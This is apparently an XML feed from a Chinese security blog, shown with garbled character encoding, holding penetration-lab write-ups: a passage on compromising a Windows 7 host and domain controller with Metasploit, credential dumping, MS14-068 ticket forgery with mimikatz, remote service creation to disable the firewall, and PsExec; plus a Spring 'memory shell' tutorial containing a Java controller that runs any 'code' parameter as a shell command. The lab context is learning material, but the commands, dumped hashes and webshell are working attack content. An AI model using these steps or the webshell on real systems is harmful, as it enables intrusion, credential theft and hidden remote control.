ä¸ºä¸»æœºåœ¨å†…ç½‘ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œéœ€è¦ç”¨æ­£å‘çš„shell</span><br><span class="hljs-built_in">set</span> target Windows\ 7<br><span class="hljs-built_in">set</span> RHOSTS 192.168.183.129<br><span class="hljs-built_in">set</span> rhost 192.168.183.129<br>run<br></code></pre></td></tr></table></figure><p>ä¸€é¡¿è¶…æ—¶ä¹‹åç»ˆäºæ˜¯æ‹¿åˆ°äº†meterpreter</p><p><img src="https://cdn.clown2024.cn/image-20241116180809503.png" alt="image-20241116180809503"></p><p>getuidçœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241116180833768.png" alt="image-20241116180833768"></p><p>æ¬¸å‘ç°å·²ç»æ˜¯SYSTEMæƒé™äº†</p><p>é‚£å°±ç›´æ¥ä¸åŒææƒäº†ï¼Œç›´æ¥å¸¸è§„å…ˆæ‹¿ä¸€ä¸‹è´¦å·å¯†ç ä¹‹ç±»çš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">load kiwi<br>creds_all<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">msv credentials<br>===============<br><br>Username      Domain  NTLM                              SHA1<br>--------      ------  ----                              ----<br>TESTWIN7-PC$  DEMO    e3ba914bdaca29c197c7191ebf521873  68a1422322c303e4c24d63f381a03b34eb434477<br>douser        DEMO    bc23b0b4d5bf5ff42bc61fb62e13886e  c48096437367aad00ac2dc70552051cd84912a55<br><br>wdigest credentials<br>===================<br><br>Username      Domain  Password<br>--------      ------  --------<br>(null)        (null)  (null)<br>TESTWIN7-PC$  DEMO    /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-&#x27;ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8<br>                      He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd&quot;JRr<br>douser        DEMO    Dotest123<br><br>kerberos credentials<br>====================<br><br>Username      Domain    Password<br>--------      ------    --------<br>(null)        (null)    (null)<br>douser        DEMO.COM  (null)<br>testwin7-pc$  demo.com  /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-&#x27;ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32<br>                        i8He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd&quot;JRr<br>testwin7-pc$  DEMO.COM  /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-&#x27;ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32<br>                        i8He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd&quot;JRr<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hashdump<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>testclone:1001:aad3b435b51404eeaad3b435b51404ee:8d8e04036d33ed20f5c2f6ad77e28bb7:::<br></code></pre></td></tr></table></figure><p>é‚£ç°åœ¨win7å°±æ‹¿ä¸‹äº†ï¼Œä½†æ˜¯æˆ‘æƒ³shellè·å¾—cmdçª—å£ä¸€ç›´ä¸è¡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p><img src="https://cdn.clown2024.cn/image-20241116183521507.png" alt="image-20241116183521507"></p><p>åˆä¸€ç›´å‡ºç°æ‹’ç»è¿æ¥äº†</p><p>èšŒåŸ ä½äº†æˆ‘æ›´æ–°äº†msfæƒ³é‡æ–°æ‰“è¯•è¯•çš„ï¼Œç»“æœç›´æ¥ç»™win7æ‰“è“å±å’Œæ­»æœºäº†</p><p>åæ¥å¯ä»¥ä¹‹åä»–è¿˜æ˜¯æ‹¿ä¸åˆ°cmd</p><p><img src="https://cdn.clown2024.cn/image-20241116203423166.png" alt="image-20241116203423166"></p><p>åé¢è¿˜æƒ³å°†msfæ´¾ç”Ÿåˆ°csä¸Šé¢ï¼Œä½†æ˜¯ä¸ä¼šæ´¾ç”Ÿæ­£å‘çš„shellï¼Œæˆ‘çœ‹ç½‘ä¸Šå¤§éƒ¨åˆ†éƒ½æ˜¯å…ˆcsä¸Šçº¿äº†ä¸€å°ä¸»æœºç„¶ååˆ›å»ºä¸­è½¬ç›‘å¬çš„ï¼Œæ²¡æ‰¾åˆ°ç›´æ¥æ´¾ç”Ÿæ­£å‘shellçš„</p><h2 id="æ‰“åŸŸæ§"><a href="#æ‰“åŸŸæ§" class="headerlink" title="æ‰“åŸŸæ§"></a>æ‰“åŸŸæ§</h2><p>é‚£è¿™æ¬¡ç”¨ä¸ä¸Šcsï¼Œç›´æ¥msfä¸€è·¯æ€</p><p>å…ˆç»§ç»­å°è¯•ä¸€ä¸‹æˆ‘ä»¬åˆšåˆšæ‰«å‡ºæ¥çš„æ°¸æ’ä¹‹è“</p><p><img src="https://cdn.clown2024.cn/image-20241116211150550.png" alt="image-20241116211150550"></p><p>okæ‰“äº†ä¸¤éå¤±è´¥äº†ï¼Œé‚£å°±è¯•è¯•å…¶ä»–çš„å§</p><p>è€ƒç‚¹ä¹Ÿè¯´äº†ç”¨åˆ°äº†ms14-068æ¼æ´ï¼Œç”¨msfæœç´¢äº†ä¸€ä¸‹åªæœ‰éªŒè¯æ¼æ´çš„ï¼Œæ²¡æœ‰åˆ©ç”¨æ¼æ´çš„ç¨‹åº</p><p><img src="https://cdn.clown2024.cn/image-20241116211428215.png" alt="image-20241116211428215"></p><blockquote><p>ç¬‘æ­»åæ¥å‘ç°è¿™ä¹Ÿæ˜¯åˆ©ç”¨çš„ï¼Œå› ä¸ºè¿™ä¸ªæ¨¡å—å¤šç”¨äºä¿¡æ¯æ”¶é›†</p></blockquote><p>çœ‹äº†ä¸€ä¸‹win7ï¼Œä½œè€…è´´å¿ƒçš„æŠŠå·¥å…·éƒ½ç»™æˆ‘ä»¬é™„ä¸Šäº†</p><p><img src="https://cdn.clown2024.cn/image-20241116212028478.png" alt="image-20241116212028478"></p><p>åˆ©ç”¨åŸç†å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/feizianquan/p/11760564.html">https://www.cnblogs.com/feizianquan/p/11760564.html</a></p><p>ç›´æ¥æŠŠå·¥å…·ä»win7é‚£æ‹¿è¿‡æ¥æ–¹ä¾¿ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">download C:\\Users\\douser\\Desktop\\MS14-068.exe /home/kali/Desktop<br></code></pre></td></tr></table></figure><p>æ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š</p><p>1.åŸŸæ§æ²¡æœ‰æ‰“MS14-068çš„è¡¥ä¸(KB3011780)</p><p>2.æ‹¿ä¸‹ä¸€å°åŠ å…¥åŸŸçš„è®¡ç®—æœº</p><p>3.æœ‰è¿™å°åŸŸå†…è®¡ç®—æœºçš„åŸŸç”¨æˆ·å¯†ç å’ŒSid</p><p>æˆ‘ä»¬è¿˜å·®ä¸€ä¸ªsidæ²¡æœ‰æŠ“å–åˆ°ï¼Œè¦å»æŠ“å–ä¸€ä¸‹</p><p>çº¢æ¸©äº†ï¼Œè¿™ä¼šè¯åˆæ–­äº†ï¼Œå—ä¸äº†äº†ï¼Œç›´æ¥å»win7é‚£é‡Œå·ä¸€ä¸ªsidè¿‡æ¥(S-1-5-21-979886063-1111900045-1414766810-1107)ï¼Œdouserç”¨æˆ·çš„</p><p>æ­£å¸¸èƒ½æ‹¿cmdçš„è¯ç›´æ¥whoami &#x2F;allæˆ–è€…whoami &#x2F;userå°±èƒ½çœ‹åˆ°sidäº†</p><p>æˆ–è€…ç”¨meterpreterçš„run post&#x2F;windows&#x2F;gather&#x2F;credentialsåº”è¯¥ä¹Ÿå¯ä»¥</p><p>å·¥å…·åˆ©ç”¨çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;<br></code></pre></td></tr></table></figure><p>å®Œäº†xsæ‰å‘ç°è¿™æ˜¯exeç¨‹åºï¼ŒLinuxç”¨ä¸äº†ï¼Œé‚£å°±æ”¹å‚è€ƒè¿™ç¯‡æ–‡ç« çš„å…¶ä»–æ‰“æ³•ï¼š<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/04.%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/04.%E5%9F%9F%E6%8E%A7%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E.html#cve-2014-6324%EF%BC%88ms14-068%EF%BC%89">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/04.%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/04.%E5%9F%9F%E6%8E%A7%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E.html#cve-2014-6324%EF%BC%88ms14-068%EF%BC%89</a></p><p>çœ‹äº†åŠå¤©å¾—ä½œç½¢äº†æ„Ÿè§‰ğŸ˜­ï¼ŒåŸºæœ¬éƒ½æ˜¯åœ¨cmdä¸‹æ“ä½œæˆ–è€…ç›´æ¥å¼€å¯è¿œç¨‹æ¡Œé¢ä¸Šå»æ“ä½œ</p><p>ç®€å•è®°ä¸€ä¸‹æµç¨‹å§ï¼Œä¸‹é¢çš„æ“ä½œæ˜¯åœ¨win7çš„cmdä¸Šæ‰§è¡Œçš„ï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/zy15667076526/article/details/116059592">https://blog.csdn.net/zy15667076526/article/details/116059592</a></p><p>é¦–å…ˆç”¨ms14-068ä¼ªé€ ç¥¨æ®</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">ms14-<span class="hljs-number">068</span>.exe -u douser@DEMO.com -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">979886063</span>-<span class="hljs-number">1111900045</span>-<span class="hljs-number">1414766810</span>-<span class="hljs-number">1107</span> -d <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">183</span>.<span class="hljs-number">130</span> -p Dotest123<br></code></pre></td></tr></table></figure><p>ä»–ä¼šç”Ÿæˆä¸€ä¸ªç¥¨æ®æ–‡ä»¶ï¼Œç„¶åç”¨mimikatzæ¥æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz # kerberos::purge         //æ¸…ç©ºå½“å‰æœºå™¨ä¸­æ‰€æœ‰å‡­è¯ï¼Œå¦‚æœæœ‰åŸŸæˆå‘˜å‡­è¯ä¼šå½±å“å‡­è¯ä¼ªé€ <br>mimikatz # kerberos::list          //æŸ¥çœ‹å½“å‰æœºå™¨å‡­è¯<br>mimikatz # kerberos::ptc &lt;ç”Ÿæˆçš„ç¥¨æ®æ–‡ä»¶&gt;   //å°†ç¥¨æ®æ³¨å…¥åˆ°å†…å­˜ä¸­<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æŸ¥çœ‹åŸŸæ§æˆ–è€…åˆ—å‡ºå…¶cç›˜çš„æ–‡ä»¶äº†</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> use \\WIN-ENS2VR5TR3N<br><span class="hljs-built_in">dir</span> \\WIN-ENS2VR5TR3N\c$<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥é€šè¿‡scå‘½ä»¤æ¥åˆ›å»ºæœåŠ¡æ‰§è¡Œå‘½ä»¤ï¼Œæ¯”å¦‚å…³é—­é˜²ç«å¢™</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &quot;netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off&quot;<br><br>sc \\WIN-ENS2VR5TR3N <span class="hljs-built_in">start</span> unablefirewall<br></code></pre></td></tr></table></figure><p>å…³é—­é˜²ç«å¢™ä¹‹åå°±å¯ä»¥ç›´æ¥æ°¸æ’ä¹‹è“ä¸Šçº¿äº†å…¶å®</p><p>ä¹‹å‰å¤±è´¥æ˜¯å› ä¸ºè¢«é˜²ç«å¢™æ‹¦æˆª</p><p><strong>ä¸€äº›æ¸…é™¤ç—•è¿¹çš„æ“ä½œ</strong></p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">klist purge #å¸è½½å‡­æ®<br>klist #æŸ¥çœ‹ç¥¨æ®<br></code></pre></td></tr></table></figure><p><strong>è·å–äº¤äº’å¼shell</strong></p><p>ç°åœ¨æ˜¯æˆåŠŸæ³¨å…¥äº†å‡­è¯</p><p>ç„¶åæˆ‘ä»¬å¯ä»¥åˆ©ç”¨PsExec.exeè·å–ä¸€ä¸ªäº¤äº’å¼çš„shell</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">PsExec.exe -accepteula -s \\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">19</span> <span class="hljs-built_in">cmd</span>.exe<br></code></pre></td></tr></table></figure><p><strong>è¿œç¨‹ç™»å½•æ“ä½œ</strong></p><p>å¯ä»¥ç›´æ¥ç”¨æ°¸æ’ä¹‹è“è·å–å¯†ç ä¹‹åredesktopç™»å½•</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ—¥é¶åœºä¸‰</title>
      <link href="/2024/11/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89/"/>
      <url>/2024/11/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h1><p>æ‰“å¼€è™šæ‹Ÿæœºé•œåƒä¸ºæŒ‚èµ·çŠ¶æ€ï¼Œç¬¬ä¸€æ—¶é—´è¿›è¡Œå¿«ç…§ï¼Œéƒ¨åˆ†æœåŠ¡æœªåšè‡ªå¯ï¼Œé‡å¯åæ— æ³•è‡ªåŠ¨è¿è¡Œã€‚</p><p>æŒ‚èµ·çŠ¶æ€ï¼Œè´¦å·å·²é»˜è®¤ç™»é™†ï¼Œcentosä¸ºå‡ºç½‘æœºï¼Œç¬¬ä¸€æ¬¡è¿è¡Œï¼Œéœ€é‡æ–°è·å–æ¡¥æ¥æ¨¡å¼ç½‘å¡ipï¼Œä¹Ÿå°±æ˜¯é‡å¯ä¸€ä¸‹</p><p>é™¤é‡æ–°è·å–ipï¼Œä¸å»ºè®®è¿›è¡Œä»»ä½•è™šæ‹Ÿæœºæ“ä½œã€‚</p><p><img src="https://cdn.clown2024.cn/image-20241115110952089.png" alt="image-20241115110952089"></p><p><strong>ç›®æ ‡ï¼šåŸŸæ§ä¸­å­˜åœ¨ä¸€ä»½é‡è¦æ–‡ä»¶ã€‚</strong></p><p>æœ¬æ¬¡ç¯å¢ƒä¸ºé»‘ç›’æµ‹è¯•ï¼Œä¸æä¾›è™šæ‹Ÿæœºè´¦å·å¯†ç ã€‚</p><h1 id="ä½œåºŸäº†"><a href="#ä½œåºŸäº†ğŸ˜­" class="headerlink" title="ä½œåºŸäº†ğŸ˜­"></a>ä½œåºŸäº†ğŸ˜­</h1><p>ä¸¤å°Linuxé¶æœºè¿è¡Œä¸äº†ï¼Œåªèƒ½å¼ºåˆ¶é‡å¯æ‰èƒ½ç”¨ï¼Œä½†æ˜¯è¿™æ ·å°±ä¸æ˜¯ç™»å½•çŠ¶æ€äº†ï¼Œç„¶åè´¦å·å¯†ç ä¹Ÿä¸çŸ¥é“ï¼Œç›´æ¥æ­»åœ¨æ­å»ºç¯å¢ƒäº†</p><p>åªèƒ½çœ‹çœ‹åˆ«äººçš„æ‰“é¶è¿‡ç¨‹äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Springå†…å­˜é©¬å­¦ä¹ </title>
      <link href="/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>Springæ¡†æ¶æ¯”è¾ƒå¸¸ç”¨å°±ä¸è¯´äº†ï¼Œç½‘ä¸Šå¤§éƒ¨åˆ†éƒ½æ˜¯å»ºä¸€ä¸ªspring+springmvcçš„é¡¹ç›®æ¥æµ‹è¯•å†…å­˜é©¬ï¼Œå†…å­˜é©¬ä¸»è¦çš„é€»è¾‘éƒ¨åˆ†éƒ½é›†ä¸­åœ¨springmvcçš„éƒ¨åˆ†ï¼Œå› ä¸ºè´Ÿè´£å¤„ç†è·¯ç”±è¯·æ±‚åŸºæœ¬éƒ½æ˜¯éƒ½æ˜¯éœ€è¦ç»ç”±springmvcï¼Œæ‰€ä»¥æˆ‘çœ‹ä¹Ÿæœ‰å«springmvcå†…å­˜é©¬çš„ã€‚</p><p>æˆ‘è¿™é‡Œå°±ç›´æ¥æ­ä¸€ä¸ªspringbooté¡¹ç›®æ¯”è¾ƒæ–¹ä¾¿äº†ï¼Œåæ­£æœ¬èº«ä¹Ÿæ˜¯æœ‰springmvcçš„ï¼Œæ‰€ä»¥å†…éƒ¨é€»è¾‘ä¹Ÿæ˜¯ä¸€æ ·åˆ†æ</p><p>ç‰ˆæœ¬å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5.10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="controllerå†…å­˜é©¬"><a href="#Controllerå†…å­˜é©¬" class="headerlink" title="Controllerå†…å­˜é©¬"></a>Controllerå†…å­˜é©¬</h1><h2 id="contolleræ³¨å†Œæµç¨‹"><a href="#Contolleræ³¨å†Œæµç¨‹" class="headerlink" title="Contolleræ³¨å†Œæµç¨‹"></a>Contolleræ³¨å†Œæµç¨‹</h2><p>æˆ‘ä»¬è¦å…ˆçŸ¥é“Controllerçš„æ³¨å†Œé€»è¾‘</p><p>ç¼–å†™ä¸€ä¸ªç®€å•çš„controllerç„¶åä¸‹æ–­ç‚¹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241113133819511.png" alt="image-20241113133819511"></p><p>è¿™é‡Œèƒ½çœ‹åˆ°è¯·æ±‚å¤„ç†çš„è°ƒç”¨æ ˆ</p><p>åœ¨AbstractHandlerMethodMappingçš„initHandlerMethodsæ–¹æ³•ä¸‹æ–­ç‚¹æ¥çœ‹çœ‹æ˜¯æ€ä¹ˆæ³¨å†Œcontrollerçš„</p><p><img src="https://cdn.clown2024.cn/image-20241113134431011.png" alt="image-20241113134431011"></p><p>ä»è¿™ä¸ªä»£ç ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°å°±æ˜¯å¼€å§‹å¯¹æ¯ä¸ªæ‰«æåˆ°çš„beanNameå¯¹åº”çš„beanå¼€å§‹å¤„ç†</p><p>è¿›å»çœ‹çœ‹ä»–çš„processæ–¹æ³•æ˜¯æ€ä¹ˆå¤„ç†çš„</p><p><img src="https://cdn.clown2024.cn/image-20241113135311833.png" alt="image-20241113135311833"></p><p>ç›´æ¥çœ‹å¯¹æˆ‘ä»¬å†™çš„helloControlleræ˜¯æ€ä¹ˆå¤„ç†ï¼Œè¿™é‡Œæœ‰ä¸ªisHandler()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241113135415874.png" alt="image-20241113135415874"></p><p>ä»–ä¼šåˆ¤æ–­è¿™ä¸ªbeanæ˜¯å¦ä¸ºControlleræˆ–è€…RequestMappingï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬çš„è¿™ä¸ªä¼šè¿”å›true</p><p>ç„¶åå°±ä¼šè¿›åˆ°<strong>detectHandlerMethods</strong>æ–¹æ³•ï¼Œè¿›å»çœ‹ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241113162637157.png" alt="image-20241113162637157"></p><p>å¯ä»¥çœ‹åˆ°ä»–ä¼šå…ˆè·å–å¯¹åº”çš„userTypeã€handlerã€methodï¼Œè¿˜æœ‰å¯¹åº”çš„Mappingï¼Œæœ€åéå†ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•å’Œmappingï¼Œç„¶åè°ƒç”¨ä¸€ä¸ªregisterHandlerMethodæ–¹æ³•æ¥è¿›è¡Œæ³¨å†Œç»‘å®š</p><p>è¿™é‡Œçš„mappingä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ä»–çš„ä¿¡æ¯æ˜¯è¢«ä¿å­˜åœ¨RequestMappingInfoè¿™ä¸ªç±»ä¸­çš„ï¼Œä¸‹é¢æ˜¯è¯¥ç±»ä¸­çš„ä¸€äº›å±æ€§</p><p><img src="https://cdn.clown2024.cn/image-20241113163354872.png" alt="image-20241113163354872"></p><p>ç„¶åmappingçš„åˆ›å»ºæ˜¯åœ¨å‰é¢çš„getMappingForMethodæ–¹æ³•åˆ›å»ºçš„</p><p><img src="https://cdn.clown2024.cn/image-20241113163647021.png" alt="image-20241113163647021"></p><p>è¿›å»çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241113164045236.png" alt="image-20241113164045236"></p><p>é‡Œé¢çš„å…·ä½“æµç¨‹å°±è‡ªå·±çœ‹çœ‹å°±è¡Œï¼Œæ€»ä¹‹ä»–ä¼šè§£ææ–¹æ³•ä¸Šçš„æ³¨è§£ï¼Œç„¶ååˆ›å»ºå¯¹åº”çš„RequestMappingInfo</p><p>å†å›åˆ°registerHandlerMethodæ³¨å†Œæ–¹æ³•è¿™é‡Œ</p><p><img src="https://cdn.clown2024.cn/image-20241113164335000.png" alt="image-20241113164335000"></p><p><img src="https://cdn.clown2024.cn/image-20241113164359179.png" alt="image-20241113164359179"></p><p><img src="https://cdn.clown2024.cn/image-20241113164444913.png" alt="image-20241113164444913"></p><p>å¯ä»¥çŸ¥é“ï¼Œæœ€ç»ˆå°±æ˜¯è°ƒç”¨çš„AbstractHandlerMethodMapping$MappingRegistryçš„registeræ–¹æ³•å°†è·¯ç”±å’Œæ–¹æ³•æ³¨å†Œè¿›å»çš„ï¼Œè·Ÿåˆ°è¿™é‡Œå°±å·²ç»å¤Ÿäº†</p><p>æ‰€ä»¥æˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªcontrolleræœ€ç»ˆå°±æ˜¯è¦è°ƒç”¨MappingRegistry#registeræ–¹æ³•ï¼Œè°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„æ¡ä»¶æ ¹æ®å‰é¢çš„åˆ†æå¯çŸ¥</p><ol><li>beanå®ä¾‹</li><li>å¤„ç†è¯·æ±‚çš„method</li><li>å¯¹åº”çš„RequestMappinginfoå¯¹è±¡</li></ol><h2 id="å†…å­˜é©¬å®ç°"><a href="#å†…å­˜é©¬å®ç°" class="headerlink" title="å†…å­˜é©¬å®ç°"></a>å†…å­˜é©¬å®ç°</h2><p>å‚è€ƒy4å¸ˆå‚…çš„å®ç°æ–¹å¼</p><p>é¦–å…ˆæˆ‘ä»¬è¦ç¼–å†™ä¸€ä¸ªæ­£å¸¸çš„controllerç±»ï¼Œä¹Ÿä¸èƒ½è¯´æ­£å¸¸å°±æ˜¯å»æ‰æ³¨è§£çš„controllerï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯æ‰‹åŠ¨åŠ è½½çš„æ‰€ä»¥ä¸éœ€è¦æ³¨è§£</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(p.start().getInputStream())).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next() : o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°†ä»–ç¼–è¯‘æˆ.classæ–‡ä»¶ï¼Œå†æ‹¿ä»–çš„base64ç¼–ç çš„å­—ç¬¦ä¸²ç”¨ä¸‹é¢ä»£ç 